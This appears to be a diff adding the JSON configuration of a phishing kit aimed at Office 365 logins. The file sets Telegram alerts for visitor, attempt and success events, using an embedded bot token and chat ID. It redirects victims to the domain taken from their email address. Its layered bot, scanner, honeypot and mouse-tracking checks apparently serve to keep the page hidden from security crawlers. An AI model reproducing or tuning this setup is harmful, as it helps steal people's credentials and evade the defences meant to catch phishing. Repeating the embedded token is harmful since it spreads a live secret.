@@ -1,0 +1,105 @@
+{
+  "notifications": {
+    "telegram": {
+      "enabled": true,
+      "botToken": "7657948339:AAH3vYzjJeod7ZHzZyljNrQTWiO8RTSBc1I",
+      "chatId": "6507005533",
+      "events": [
+        "visitor",
+        "attempt",
+        "success"
+      ]
+    },
+    "email": {
+      "enabled": false,
+      "smtpHost": "",
+      "smtpPort": 587,
+      "smtpUser": "",
+      "smtpPassword": "",
+      "fromEmail": "",
+      "events": [
+        "daily_summary",
+        "success",
+        "link_expired"
+      ]
+    }
+  },
+  "security": {
+    "botFilter": {
+      "enabled": true,
+      "checkIPBlocklist": true,
+      "cloudflareBotManagement": true,
+      "scannerDetection": true
+    },
+    "captcha": {
+      "enabled": false,
+      "provider": "turnstile",
+      "turnstileSiteKey": "",
+      "turnstileSecretKey": "",
+      "privatecaptchaSiteKey": "",
+      "privatecaptchaSecretKey": ""
+    },
+    "botDelay": {
+      "enabled": true,
+      "min": 3,
+      "max": 7
+    },
+    "stealthVerification": {
+      "enabled": true,
+      "behavioralAnalysis": true,
+      "mouseTracking": true,
+      "scrollTracking": true,
+      "honeypot": true,
+      "minimumTime": 3,
+      "botScoreThreshold": 50
+    },
+    "gates": {
+      "layer1BotFilter": true,
+      "layer1IpBlocklist": true,
+      "layer1CloudflareBotManagement": true,
+      "layer1ScannerDetection": true,
+      "layer2Captcha": true,
+      "layer3BotDelay": true,
+      "layer4StealthVerification": true
+    },
+    "networkRestrictions": {
+      "allowVpn": true,
+      "allowProxy": true,
+      "allowDatacenter": true
+    }
+  },
+  "filtering": {
+    "geographic": {
+      "enabled": false,
+      "allowed": [],
+      "blocked": []
+    },
+    "device": {
+      "desktop": true,
+      "mobile": true,
+      "tablet": true
+    },
+    "browser": {
+      "chrome": true,
+      "firefox": true,
+      "safari": true,
+      "edge": true,
+      "opera": false,
+      "other": false
+    },
+    "network": {
+      "blockVPN": false,
+      "blockProxy": false,
+      "blockDatacenter": false,
+      "blockTor": false
+    }
+  },
+  "templates": {
+    "default": "office365"
+  },
+  "redirects": {
+    "customUrl": "",
+    "useDomainFromEmail": true,
+    "redirectDelaySeconds": 10
+  }
+}
